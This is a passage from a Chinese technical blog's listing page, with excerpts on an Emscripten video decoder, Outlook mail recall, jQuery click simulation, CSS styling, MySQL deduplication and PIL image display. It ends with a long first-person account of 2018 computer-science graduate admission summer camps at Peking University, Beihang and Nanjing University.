// Decoder.cpp : Defines the exported functions for the DLL application. //编译命令： //emcc -O3 --bind -o ParseLib.bc ParseLib.cpp //emcc -O3 --bind -o GetH264FromPS.bc GetH264FromPS.cpp //emcc -O3 --bind -o H264Decode.bc H264Decode.cpp //emcc --bind ParseLib.bc GetH264FromPS.bc H264Decode.bc libavcodec.bc libavutil.bc -O3 // -s WASM=1 -s EXPORTED_FUNCTIONS=" //['_Init','_PsToYUV','_InputData','_GetOneFrame','_GetBuffer','_UnInit']" -s //TOTAL_MEMORY=128*1024*1024 -s ALLOW_MEMORY_GROWTH=0 -o decode.js #include "GetH264FromPS.h" #include &lt;emscripten/bind.h&gt; #define BUFFER_SIZE 1280*720*2 #define FRAME_IS_NULL -1 using namespace emscripten; struct FRAME_INFO { int dWidth; int dHeight; //int Linesize_Fir; //int Linesize_Sec; //int Linesize_Thi; }; FRAME_INFO g_stFrameInfo = {0}; unsigned char* g_Buffer = NULL; FRAME_INFO GetFrameInfo() { return g_stFrameInfo; } #ifdef __cplusplus extern "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5923064f8833019dab467ad0d7901962/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2dfe3a736b2c7443c16b625da4032a28/" rel="bookmark">
			outlook邮件撤回
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		下面以Microsoft Outlook为例，撤回邮件步骤如下：
1.在邮件中点击已发送邮件；
2.双击打开需要撤回的邮件；
3.选择“其他操作”，点击“撤回该邮件”；
4.选择“该邮件的未读副本”以及“告诉我对每个收件人的撤回操作是成功还是失败”，点击确定；
5.如果成功，你将收到下图所示的邮件。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fb2efc5beba088d6cda826ff073d5bee/" rel="bookmark">
			js触发点击事件--模拟鼠标点击动作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		需求：点击全部，显示终端列表里的 当前和 历史 两列 默认当前 且刷新数据，点击离线 只显示历史并同时刷新数据
大部分都是鼠标直接点击事件click
但是有时候需要有默认，比如初始化的时候就默认点击第一行
这时候就得模拟点击事件了
但是模拟点击事件的前提是，你已经定义了这个click事件
$('.js-btnHistory') .click(); $('.js-btnNow') .click(); 属于js触发点击事件，相当于点击全部按钮 或者 离线按钮时，也点击了 当前和 历史 按钮 实现数据刷新
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/54f9f61091389983b32ab58390ebd1c9/" rel="bookmark">
			python task.pyc进程占用CPU非常高，请问怎么处理比较好？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		python task.pyc进程占用CPU非常高，请问怎么处理比较好？用的宝塔
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/572a4d81a161007acb2e30b4732dc7aa/" rel="bookmark">
			css美化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		字体样式
属性名 含义 举例
font-family 设置字体类型 font-family:"隶书";
font-size 设置字体大小 font-size:12px;
font-style 设置字体风格 font-style:italic;
font-weight 设置字体的粗细 font-weight:bold;
font 在一个声明中设置所有字体属性 font:italic bold 36px "宋体";
字体的粗细
font-weight属性
normal 默认值，定义标准的字体
bold 粗体字体
bolder 更粗的字体
lighter 更细的字体
字体属性
font属性
字体属性的顺序：字体风格→字体粗细→字体大小→字体类型
p span{font:oblique bold 12px "楷体";}
文本样式
文本属性
color 设置文本颜色 color:#00C;
text-align 设置元素水平对齐方式 text-align:right;
text-indent 设置首行文本的缩进 text-indent:20px;
line-height 设置文本的行高 line-height:25px;
text-decoration 设置文本的装饰 text-decoration:underline;
文本颜色
color属性
RGB
十六进制方法表示颜色：前两位表示红色分量，中间两位表示绿色分量，最后两位表示蓝色分量
rgb(r,g,b) : 正整数的取值为0～255
RGBA
在RGB基础上增加了控制alpha透明度的参数，其中这个透明通道值为0～1
排版文本段落
left 把文本排列到左边。默认值：由浏览器决定
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/572a4d81a161007acb2e30b4732dc7aa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/82e1027c2b2fc590625816a582a40b95/" rel="bookmark">
			UVALive - 3938 &#34;Ray, Pass me the dishes!&#34;
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		注意分清三种情况，并且保证字典序最小
#include &lt;cstdio&gt; #include &lt;cstring&gt; #include &lt;algorithm&gt; #include &lt;iostream&gt; #define ls o&lt;&lt;1 #define rs o&lt;&lt;1|1 #define lson L, mid, ls #define rson mid+1, R, rs using namespace std; const int maxn = 5e5 + 10; typedef long long ll; int n, m; ll s[maxn]; struct Node { int vl, vr;//解区间 int suf, pre;//后缀的最左端、前缀的最右端 }tree[maxn&lt;&lt;2]; void pushup(int l, int r, int o) { tree[o].pre = (s[tree[ls].pre]-s[l-1] &gt;= s[tree[rs].pre]-s[l-1]) ? tree[ls].pre : tree[rs].
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/82e1027c2b2fc590625816a582a40b95/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/edf609b963848e4a303ce589438bcafc/" rel="bookmark">
			Python用PIL的Image.show()函数，图片无法显示，报错
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天就碰到了这个情况。 报错内容是，需要关联默认程序什么的 我网上搜索了一下，很多复杂的解决方案，甚至需要到show这个库里面去改代码。 后来摸索了一下，发现是这个问题：
图片处理，都会先变成bmp模式，平时一般很少用.bmp属性的照片，那么windows就没有关联到这个属性图片的默认打开程序。 所以，打开画图板，随便画点什么，另存为bmp属性的照片。 然后右键这张照片，选择打开方式–默认打开程序，选择照片浏览器或者画图板。 然后，你会发现，Imagh.show()这个方法就可以用了。
嘻嘻。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/051138953cec9a0f94e6f300c8b026a9/" rel="bookmark">
			MYSQL 删除表中的重复数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		test表中的原始数据:
test表中name字段信息有重复，想进行过滤删除重复数据
删除重复数据之后的预期结果（不考虑id）：
方法一：
用 create ......select......group by ......
先创建临时表tab,新表tab中的数据时从test表中分组查询出来的
create table tab select name ,code from test group by name
拷贝原test的表结构为新表test1。然后删除原表test。
drop table test
然后查看tab表：
此时tab表中的信息已经删除了重复信息（只考虑name字段的重复性）
但是你会发现tab表中没有id，我们需要加上id，所以就将tab表中的数据插入test1中。
用 insert into ......select ......的方法
执行：insert into test1 select null,name,code from tab;
执行后查看test1表中的信息：
达到去删除重复数据的效果。
最后将表test1改名为test就可以了
alter table test1 rename to test 备注：insert into test1 select null,name,code from tab;
利用mysql主键自增的特性，所以后面的select语句给id赋值为null即可。
方法二：
删除重复数据，保留重复数据中最小id所在行的数据
delete from test
where
name in (select pname from (select name as pname from test group by name having count(name) &gt; 1) a)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/051138953cec9a0f94e6f300c8b026a9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/93a53c875fb8ab47683fb14730e5a889/" rel="bookmark">
			保研推免经历经验分享——2018北大软微、北航计算机、南大计算机夏令营保研经历
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		#2018北大软微软工夏令营保研经历
因为自己当初在选择要保到软微的时候曾经花费了大量的时间在网上寻找相关的保研经验，但是相关信息极度匮乏，导致我直到去夏令营报到才知道了整个流程，也是在听完了宣讲才清楚了软微的确切情况。我很菜，和其他写保研去清华北大经验帖的大佬相比可以说是菜出了翔，英语很烂，没什么科研项目，没什么牛逼的竞赛经历，只是一个埋头学习书本知识的苦行僧，除了还能拿得出手的成绩排名为一无所有，这也是为什么会选择去这个在清北所有学院里看起来是最弱的软微。曾经的经历让我想要写一篇文章来帮助未来想保研去软微软工的同学，同时也记录一下我的保研经历。
接下来我会介绍为保研做的准备和参加夏令营的经历，着重是软微软件工程夏令营的相关情况。本文更多的是个人经历的记录，并没有什么鸡汤经验分享，至于读者能够获得什么样的帮助这要看个人感悟了，当然你也可以把这当作闲时的一个乐子。
先介绍一下我的个人情况，为了防止被熟人认出，敏感信息模糊处理。
-本科学校 末流985（各省高考985录取线它基本都是末流）
-排名 前2%（我们学校是按绩点排名，百分制的成绩不看）
-一个大一点的项目，两个小一点的项目，数学建模国赛省二（这些都比较水）
-四级500+，六级没过
以上是能用得到的信息，至于国奖、校内奖学金、企业奖学金个人认为没什么卵用，我凭借着上述成功入营。这是北京大学软件与微电子学院关于举办2018年软件工程学科优秀大学生夏令营的通知 。除此之外还入营了北航计算机，南大计算机，计算所（没去）。至于我为什么能入营，个人认为软微口碑不好是一个重要原因。许多大佬根本就不会考虑软微，软微所谓的“黑料”网上一大堆，好奇的同学自己百度。
夏令营前的准备 我从很早就想保研到北大，因为当时觉得离保研还远，只知道成绩必须要好，所以我努力学习，把成绩提升到一个还不错的位置。当时想着是信科，后来发现不太现实，但是又想去北大，知道了软微名声不太好，觉得这个希望挺大的，于是我就把软微作为了首要目标。到了大三下学期，前五个学期的成绩出来了，这个时候我就开始改变自己的学习策略。大三下学期的课程只在课堂上学，课下绝对不看，只有在6月的考试周才复习，因此大三下考得比较差，但是我早就不在乎了，因为夏令营要的是前五个学期的排名，如果我能将大三下时间首要用于保研的准备，这样夏令营成功的可能性就更大了，如果我夏令营的都成功了，我还会去在乎大三学年的排名？奖学金？对不起，毫不在乎，更不要说这是北大，就算软微差一点，但也是北大。基于上述想法，我在大三下学期干的最多的就是和保研的准备。对于需要准备的地方，我觉得可以分为材料和知识的准备这两个方面。先说保研相关的材料，尽管2018年的夏令营通知还没有出来，但是2017年的可以找到，并且一般来说不会有太大的变化，所以可以查看往年信息来判断自己是否满足硬性条件，比如对英语成绩的要求，以及一些可以尽早准备的材料，比如专家推荐信。身份证、学生证、四六级证书、获奖证书的复印件，还有别的一些项目科研经历论文等都可以根据实际情况来准备。推荐信可以找任课老师，但是并不是所有任课老师都是副教授或教授，这些信息可以在学院官网上查到。然后邮件联系老师，把提前写好的推荐信给老师一并发过去，多数老师对于这种只需要直接签字的推荐信还是很容易同意的。但是对于北大，最好找和自己比较熟悉的老师比如项目的指导老师，这样更有说服力。另外关于哪些学校需要推荐信以及何时邮寄纸质材料，每个学校都不太一样，而且一个学校可能每年会变。但是清北几乎可以肯定是需要推荐信的，而且老师们也挺在乎推荐信的，只是人家没有明确说出来。一封好的推荐信对你的入营有挺大的帮助，毕竟对于绝大多数外校同学来说，入营清北是相当困难的。对于知识储备分为机试、英语、专业课、项目科研论文等四个大方面。
-机试。最好要有参考书，这样可以帮你有条理地准备。《王道考研机试》和《程序设计在线导引》（北大出版的红皮书），这两本书都非常好。另外，看懂和会写完完全全是两个难度的事，不要以为能看懂就觉得自己没问题了，一定要亲自去敲代码。我的做法是，将《王道》全部看完，然后再重新看一遍，每看完一个例题，就动手不看书敲一遍，然后对照，自己找问题，最后我又重新看一遍，这次边看边背。在我最巅峰的状态时，书上95%以上的代码我能自己正确敲出来，另外并不是我所敲的所有代码都和书上完全一样，这是因为我不是死记硬背，而是真的会做了，有了自己的思路，然后将思路转换为代码。想一想高中你背了多少优秀的作文才能写出同样出色的文章，你就明白这样做是由一定作用的，而且上述两本书都是比较简单的例题，而且很典型，试想如果连这种题都不能快速正确做出，你还想保到北大，做你的梦去吧！这样的办法对于北大保研机试来说是可以的，如果有心的话可以做一下往年北大信科叉院的上机题目，在百炼OJ上都能查到，不过不能在线练习，但是你在网上大都能搜到大神写的代码和思路。由于时间有限我没有做往年题，但我认为它是有用的。
-英语。我的六级没有过这完全出乎我的意料，这也导致上交、浙大、人大等夏令营我没有资格报名，还好北大的几个学院都是四级525六级450，我四级勉强达到要求。我的英语非常差，更不要说听力口语，我也早早地意识到了这个问题，并且根据自己的情况练习。主要练习的是口语，这个我相信有不少同学都是非常害怕的，会觉得自己的口语无药可救。没错，想要一个学期提高口语能力对多数同学来说是比较困难的，但是提高一下口语的应试是有办法的。提前准备好个人自述的各种版本，以及面试中可能问到的各种问题，把他们都背过，而且一定要熟悉。试想，如果面试的时候老师问了一个不太容易准备到的问题，你磕磕绊绊或者压根答不上来，老师就已经明白你的口语是不行的，但你必须像样地回答出一个问题，老师才可能进行下一个环节，那么老师可能会问你一个比较简单且能提前准备的问题，比如介绍一下你的学校、家乡，最喜欢的一本书、一门课、专业方向以及为什么等，这个时候如果你准备了而且流利地说出来，老师就明白你已经准备过了；相反，如果你连这种问题都答得不好，老师可能会对你的态度产生质疑，毕竟你不要忘了，你是要去北大的人。最后说一下四六级，并不是所有的学校对会在报名条件中直接对英语有要求，但几乎所有学校都会要求提供英语能力的证明，只是态度的坚决强硬程度不同。四六级当然是越早考越好，最好是大一，但是有的学校对于四六级考试有年级限制，这也没办法，但必须要有一个能拿得出手的英语证明。下面列举出18年部分学校对英语的要求，想要更详细准确的也可以去看各校的通知：软件所——英语达到国家六级或四级优秀水平；信工所——英语达到国家四/六级水平；自动化所——有较为良好的英语能力，特别是英语阅读、写作能力； 计算所——英语四六级成绩单复印件或其他体现自己英语水平的证明材料；上交——英语要求CET6≥425或TOEFL≥90或IELTS≥6.0 ；北航计算机——英语水平证明(成绩单)复印件（如有）；南大计算机——英语六级或四级成绩证明复印件（加盖所在学校教务处或院系公章）、其他外语能力证明材料；复旦计算机——必要的其他证明材料复印件（如已发表的论文、各类获奖或资格证书、CET四、六级等各类英语考试成绩单）；浙大计算机——（无夏令营）申请直博的外语要求：通过国家英语六级480分，也可以用TOEFL80或雅思6代替；清华计算机——英语水平良好；清华软院——英语水平良好，具有较熟练的听说读写能力；北大叉院——体现自身英语水平的证明（如国家英语四、六级考试成绩、或TOEFL成绩、雅思成绩与GRE成绩等复印件）；北大叉信科、软微——英语水平（符合其中一条即可）（1）国家英语四级考试525分（含）或国家英语六级考试成绩450分（含）以上；（2）TOEFL成绩100分（含）以上（IBT）；（3）GRE成绩320分（含）以上；（4）雅思成绩（学术类）6.5分（含）以上。
-专业课。能入营的人，老师相信你这些问题你都会，至少曾经会，只是现在忘了。但是不要忘了，这是北大，如果别人答得好，那最后也没你什么事了，所以专业课的知识还是要复习的。但关键是怎么复习，我认为还是要在当初学的时候就学好，是真的明白，而不是完全应付考试。课程要注意数学和专业课的取舍，很多老师都非常在意数学，而且老师往往会有这样的倾向：如果你数学答得很差，专业课正常，老师会认为你基础不扎实；但如果你数学答得好，专业课的都忘了，答得不好，老师会认为你是真的忘了（事实上你可能不是忘了，而是真的不会）。所以说，数学很重要。我自认为自己基础还不错，所以在期末考完试才复习的专业课，复习了近两个星期。复习的时候也是有重点的，可能会口头问出来而且还方便口头回答的知识点要重点看，完全适合出大题的可以选择不看。
-项目科研论文。根据自己的实际情况准备。我把我做过的项目和数学建模重新看了一遍，并且把其中可能会问的问题整理成文档，并附上答案，并且背熟。在我正式开始申报夏令营的时候我隐约感觉我其中的一个项目可能有问题，就是感觉我将来可能会栽在这里，于是我就把与这个项目有关的所有信息全部删掉，这导致简历等各种资料全都修改了一遍。总之，不熟悉的东西不要写，千万不要给自己挖坑。
至于很多同学关心的联系导师，从我参加的三个夏令营北航、软微、南大来说，几乎没用，就算联系了，夏令营表现不好也没有。而且自己也不是大佬，从联系的结果来说，相当惨烈。所以联系导师这方面我就不谈了。
北航计算机夏令营 北航夏令营是7月13日-7月15日，13日早上报到，上午是宣讲，这个时候可以提交自己的CSP成绩，用来免下午的机试，根据CSP成绩和实际机试的情况综合进行折分。比如参加机试且通过的人有100人，提交CSP的300人，你CSP成绩在所有提交的人中排名150名，那么你最后的分数和机试排名为50名的同学是一样的。但是提交CSP成绩的同学机试这一关是不会被淘汰的。提交了的同学下午就没事了，13日晚上出面试名单的具体分组和时间，14、15日两天面试，但具体到每个人也就20分钟，面试完就没什么事了。15日晚上出优秀营员名单。2017年的时候，北航是120左右的正式名单和60左右的递补名单，结果9月推免的时候都没招满（全放鸽子了）。估计18年北航也学聪明了，干脆180个正式，没有递补。16日的时候优秀营员可以在北航校医院体检，选择心仪导师并让其签字（双向选择），然后就全部结束了，当然也可以9月体检选导师。下面是我的面试情况。进去之后有5个老师，一个老师负责计时，一个老师在记录什么，三个老师主要提问，全程录像。A老师说自我介绍一下，我说用英文还是中文，老师说随便。我心里想，如果我现在用英文自我介绍，那英文环节不久可以省去吗？否则英文部分的面试太长了，不符合常理。我正准备要背诵我提前准备好的英文介绍，老师说1分钟。我立刻就慌了，然后我开始背，等我感觉1分钟的时候我就不背了，当时我正好背到和项目相关的地方，老师就用英文提问我！我听懂了老师问的，我也清楚地记得中文答案是啥，但是我不会用英文说啊，我结结巴巴近乎于全程发出“额…额…”，然后老师耐心地提示我，我真的崩溃了，就这样过去了1-2分钟这个环节勉强结束了。我本以为再也没有英语了，谁知，老师让我在一堆题里抽一个朗读并且翻译，索性我抽到一个比较简单的题，没有遇到什么生词，勉勉强强翻译完了，个人感觉应该过关了。然后老师又让我抽了一个思想政治题，题目是“你如何看待专业水平和思想道德的关系”，比较简单，就正常答，这种题答得好没什么影响，但是答得差会一票否决。接着B老师问了我简历里关于项目的一个问题，然后围绕这个又问了几个问题，C老师又让我介绍一下这个项目中的一个算法，幸好我早就准备了。然后B老师问了我一个概率论的问题，数学期望和方差，本来以为稳了，可谁知老师对我的回答不满意，说我答的和他问的不是一个问题，我很纳闷，可能我是真的理解错了老师的问题，最后，整个面试现场因为这个热闹了起来，每个老师脸上露出了难得的笑容，D老师说你要学以致用啊，顿时我就觉得凉了。最后A老师问我，编译系统的组成是什么，你们做过相关的课设吗？简要介绍一下。说一下上下文无关文法的特点。我都回答上来了，A老师说你可以走了。整个面试持续了20分钟，听说几乎每个人都是接近20分钟，但不会超过。最终的结果是我在录取名单上，但是排名在120-180之间，好在今年把正式和递补合在一起了，不然我就凉了。16日上午体检完，我就开始到处找老师，中间的过程真可谓艰辛，如戏剧一般，好在最后签了一个搞人工智能的教授，还算令人满意。我的总结是，能用CSP抵机试成绩的尽量用，有条件的早点把CSP考得高一些；录取之后的排名没有什么用，多数老师还会再单独面一次，部分老师非常抢手，可以尽早联系。另外必须要说的是，提早找住的地方，北航是不提供食宿的。
软微软工夏令营 软微入营57人（入营名单），实际报到43人，参加机试40人，刷掉了只做对1道题的2人，进入面试38人，分为3个组，学硕和直博每组13人共2组混着面试，专硕单独一组12人，其中实际参加面试11人，拿到优秀营员8人，从学硕和直博调剂过来3人，最终软工专硕录取11人，至于学硕和直博的录取情况我不清楚。更详细的情况我会在下面介绍，接着是我的整个经历。7月18日下午报到，我和小伙伴一起从北大东门进去，但进去的时候门口的保安要求出示有效证件，我就说我们是来参加夏令营的，保安问哪个夏令营，我说软微但我们还没有保到所以没有出入证明啊（这一点软微应该向信科学学，信科提前就准备证件了），保安要求看一下我们的通知，最后折腾了半天还是去门口的值班室用身份证做了登记才放我们进去。进去之后就用百度地图找，由于我们到的时候还没到预定的开始时间，但也快到了，于是陈老师就让我们进去报到，负责记录和分发物品的是软微的学长学姐，物品包括营服、营员证、一次性饭卡以及日程安排表。晚上6点会有上机练习，所以我和小伙伴就去农园复习机试，顺便吃了个饭。一直到机试开始前，夏令营群里有46人，除去老师学长3人，还剩43人，这就是我为什么得出实际报到人数为43的根据。可以想象入营57人，实际报到43人，这十几人估计是真正的大佬，为什么这么说呢，因为北大信科16-18日，北大叉院11-13日，清华计算机13-15日，清华软院叉院和南大LAMDA早在6月就已结束，所以说没来报到的人很可能已经拿到其中的某个offer，亦或者是决定出国。个人认为这些人没有报到，在某种程度上奠定了我成功的基础(●’◡’●)。晚上6点机试练习，需要用自己的百炼账号，题目的内容是和2017年信科正式上机一样，恰巧2018年信科的上机练习也是2017年信科正式上机的题目。需要注意的是，2017年信科和软微的正式上机是一起进行的，而2018年软微正式独立进行。上机练习结束后，非北京地区高校且需要提供住宿的同学坐大巴车前往万柳住宿，宿舍4人间（自愿选择室友），上床下桌，有空调浴室，住宿条件不敢说好，但很干净。头天晚上我也很放松，因为我觉得我已经拿到了北航的offer，所以软微拿不拿得到好像不是很重要了，于是我就打算把这夏令营当作一次游玩，一次对北大的参观，而且放松的心态也有利于后面的发挥。于是我就简单复习了下机试，然后就睡觉了。第二天早上也就是19日，早早就起床做大巴车赶往本校区。关于早餐，有的同学是在万柳下面的超市买的吃的，有的是到了本校区在农园吃的。接着我们去了三教的一件小教室等待讲座的开始。此时是早上7点50分，教室里只有三个同学在上自习，我动作轻盈地坐到了一个小姐姐的后方，然后我又去二楼别的教室转了转，在走廊中从学霸们的身边经过时我的内心发生了微妙的变化，直到我回到一开始的座位，看着前面的小姐姐，我在想我本科要是在这里度过那该是美妙啊。但是我一想到身边都是大佬，我就泄气了，更何况我报的是学硕，而学硕的名额少，竞争者又强，我感到自己没什么希望。就这样想着想着时间就到了，小姐姐意识到了这件教室已被征为它用，和别的同学离开了教室。一开始是张世琨教授负责开场白和软微情况的介绍。北大近年来要对硕士博士进行大刀阔斧的改革，因为上级领导认为博士是搞科研的，专硕是搞技术的，那学硕是干嘛的呢？砍掉！而且从导师的角度来说，他们更喜欢博士，所以要大量减少学硕的名额。这一点从信科就能看得出来，2018年信科的学硕保研名额减少了70%。就软微的学硕来说，原计划和17年相同是10个人，而现在学校高层说所有学院的学硕名额先全部减少20%，然后再具体情况具体操作，所以软微学硕名额变为了8个（结果后来又变成了6个/(ㄒoㄒ)/~~），全部招收保研生；而直博10个名额，其中7-8个保研名额；专硕17年共招收120左右，18年计划60人左右，其中保研名额12个。最重要的是，本次夏令营不一定招满，如果没有合适的，就等到9月推免，即宁缺毋滥。学硕和直博全部在本校跟随导师，而专硕第一年是在大兴，第二三年回本部，而且专硕不再像以前对论文不做严格要求，从这一届开始，专硕必须要进实验室，而且必须要有一篇来源于导师课题的论文方可毕业。主要目的是为了让专硕不仅仅会搞技术，也能会科研。北大会越来越重视软件工程一级学科的建设，所以虽然软微的口碑不好，但是能够看得出来在向好发展。而第一步就是减少名额，精英培养，学硕和直博的名额已经够少了，而现在专硕18年就较17年减少了50%左右，而且这还不一定，没准到时候还会减少，可以看出北大软微已经决心要想精英化发展了。而以往软微被黑的最惨的地方是他的分数和人数，但是最近几年软微的软工和计算机技术高分越来越多，加上这砍名额的力度，我想软微会越来越好的。我个人认为，之所以软工专硕第二三年能够会本部念，还可以进实验室，可能是因为信科那砍掉的70%学硕吧，才让本部有了空余的位置。可以大胆猜想：北大想让信科成为计算机科学与技术博士的科研基地，而让软微的软件工程专硕是技术培养中心，而且软工专硕也在朝着精英化的方向发展，不然你见过哪个学校会一次性砍掉这么多的名额。上述信息在此之前我从未听过，我突然觉得专硕也是一个非常非常好的选择，于是我计划在下午的时候将我的学硕更改为专硕，但由于不知道到底哪个竞争压力更小，所以到时候见机行事。接下来的2个小时，是几位教授关于自己研究方向的介绍，然后老师和我们集体出去在三教前合影留念，返回教室继续宣讲。中午12点半我们吃完饭，就直接去下午座谈的地点。座谈分为三个地点，大数据机器学习方向，智能化软件工程方向，其他方向。因为专硕只有一个方向，那就是智能化软件工程，所以我就去了对应的房间。期间过来了几位老师，又详细和我们介绍了下软件工程专硕的具体情况。智能化软件工程这个名字其实并没有太大的内涵，只是软件工程专硕必须要有一个方向，而这个方向的名字又不能和软件工程完全一样，所以起了这个名字。当然，名字也不是瞎起的，我用一句话概括：过去软件工程能提前预知数据的具体结构，这样可以提前编写相应的数据结构，然后将要处理的数据装入提前写好的数据结构；而在大数据的背景下，不可能准确预知要处理的数据的结构，这样就没办法编写对应的数据结构了，那怎么办呢？这样，智能化的软件工程就应运而生（好能扯(●’◡’●)）。在座谈期间，我越来越坚定了自己要选专硕的意愿，因为北大的软微软工专硕早已不同于别的学校的专硕，它是精英化的培养。而且，吴中海教授向我们透露，北大最多三年，要将整个学校的所有学硕全部取消！注意是取消，不是削减。届时，北大就没有学硕了。那我现在选专硕不是最好也是最有希望的选择吗？于是我去找了负责的老师，询问她能否调整方向。老师看了电脑上的统计信息后说，目前志愿为专硕的有11人，学硕22人，直博10人，你先不要转，先试一试学硕，万一你表现好呢，而且即使你没能录取，还是可以调剂到专硕的。我一想，好像的确是这么回事哈？但是转念一想，即使是调剂，那也要首先满足志愿是专硕的同学吧，一共12个名额，现在才11人，那岂不是全录取了？而且我学硕根本没希望，不存在表现好这一回事，而且如果排名靠后，那排名在我前面的同学也愿意调剂到专硕那不就凉了？想到这，我果断说，还是调整成专硕吧。然后我填写了一个表，成功转成了专硕。后来我知道又有3个人转到了专硕。注意，只能从学硕和直博向专硕调整，反过来不行；学硕直博可以互转。完事之后我和小伙伴去农园继续复习机试和吃饭。晚上5：40正式开始机试，机试的座位是提前安排好的，两个人之间隔着一个空位，书包要放到外面，准备好个人证件。电脑里又eclipse，VS6.0，VS2015，DevC++等IDE，账号学校提供，在百炼OJ上进行。机试3个小时（2018年北京大学软件工程学科夏令营上机考试），9道题，3道中文和6道英文。根据17年信科上机题目，中文比较简单，而英文无论是从阅读理解和算法上难度都要稍大一点。当时我给自己定的目标是至少做出三道题，在接下来的一个小时里，我成功做出了前三道题，这三道题不涉及算法，思路比较简单，这时自己的排名还比较靠前。接着，我选择了一道前面大佬都做出来的但是题号靠后的一道题，在我阅读完英文题意后，我判定这是一道最小生成树问题，巧了，我背的可熟了，于是我很快就做出来了，这是我的排名更靠前了。我长舒了一口气，心里想稳了。但是在接下来的一个半小时里，我毫无进展。我在做出4道题后面临了一个艰难的选择，前面大佬们AC的题目都不一样，这我可选哪道题啊，我在纠结了10分钟后选择了其中一个，然后一直到最后也没做出来。期间我曾想过换题，但是我觉得剩下的这些题目中没有一个是好做的，反而会使得之前花费的时间全部作废，与其从头开始一道题，还不如专攻一道题。结果我觉得自己没错，但就是AC不了，也没办法。最后，我的排名也比较靠前。而且一想到在我前面的有不少都是学硕直博的大佬，对我没有威胁，我就信心大增，感觉自己充满了希望。晚上回到宿舍，老师在群里发了第二天面试的名单分组，一共38人，淘汰了只AC1道的2人。我简单地复习了一下，然后就睡了。第二天即20日早上，退房，赶往本校。上午的面试从8点开始，按照面试名单上的顺序一一面试。由于我的顺序比较靠后，我就一直在教室外面复习，背诵我的英文口语。每出来一个同学大家都会上前询问。前面几位同学都被问到了智力题，英文对答，数学和专业课问题。其中我的小伙伴被要求英文自我介绍，而他也准备过了，背的相当流利，结果老师质疑他是不是提前准备过，就换了别的问题。下面是我面试的具体情况。一共有5位老师，但是从头至尾只有两位老师问过问题，一位负责记录。女老师问我最喜欢的专业课是什么，我心中窃喜，因为这个问题我准备过。我问老师是用中文还是英文，老师说中文就行。我一想完了，正当我准备用中文介绍时，老师说还是用英文吧。于是我将我准备好的背出来，期间我停停顿顿，还故作思考状，其实我记得可清楚了。结果之后就再也没有问过我英文，哈哈哈哈。我说我最喜欢的是操作系统，老师就问我中断和系统调用的区别。结果我蒙蔽了，区别是啥我也不知道啊，于是我结结巴巴把他们两个的概念答了一下，答的也很烂，反正最后也蒙混过去，老师也没再继续纠结。接着，女老师看着我报夏令营时提供的材料，根据我填的几个项目问题了关于项目本身的问题，我中规中矩地答了。然后另一个男老师看着我的简历说，看你学过线性代数，你知道线性空间是什么吗？我脑子一片空白，直接说不好意思我忘了。我当时非常紧张，因为数学问题答不上来是非常恐怖的一件事，而且说实话问题本身就是概念性的，比较简单，只是我不记得了。男老师又说，看你还学过离散数学是吗？我说是。群环域学过吗？学过。我想完蛋了，这部分可是离散里定义和定理最多的部分啊/(ㄒoㄒ)/。结果老师问了什么是群，我清楚记得首先是半群，然后是什么我就忘了，然后我想了好长时间，想出来了。老师又问，那什么是半群呢？我清楚记得它是个代数系统，然后的条件我又想了一会，是加法满足结合律和交换律，其实说错了。老师又问，你能举一个满足结合律但是不满足交换律的例子吗，我也不知道为啥脑子都没有思考就脱口而出矩阵乘法，瞪大眼睛看着老师，老师说你说的对，然后和前面的女老师说没问题了。最后我在一张表上面签了字，就离开了。需要说的是，专硕的面试比较随意，感觉老师也不是很认真，一般10多分钟；但是学硕直博那边听说一个人要半个小时。我专硕这组11人全部面试完的时候，学硕直博其中的一个组才面试了一半的人。出去后和在外面等的几个同学一起去农园吃了饭，把饭卡里的钱全部花光。我和另一个同学在北大校园逛了逛，然后就坐地铁去火车站回家了。7月25日我收到了录取通知。最后我总结了我能录取的原因，第一也是最重要的是机试成绩，它几乎决定了我的结果；其次是面试的时候我的数学没有崩盘，整体表现一般；最后是很多很多的人给了我机会，大佬们不来，而且北大关于硕士的改革是在夏令营报名之后才知道的，所以有很多优秀的同学并没有选择软微，而现在软微的软工专硕就不是那么好进了，砍掉了近一半的名额。这是软微软工夏令营最正式的一次，也可以说是夏令营正规化的第一年，我感觉以后想进就没有这么容易了。另外，参加了本次夏令营但是没有拿到offer的同学，如果愿意，他们可以直接获得计算机技术的保研资格，另外据小道消息，2018年计算机技术的保研名额在30个左右，考研名额不知。专硕的导师是要等到第二年开学后才分，有一个双选会。
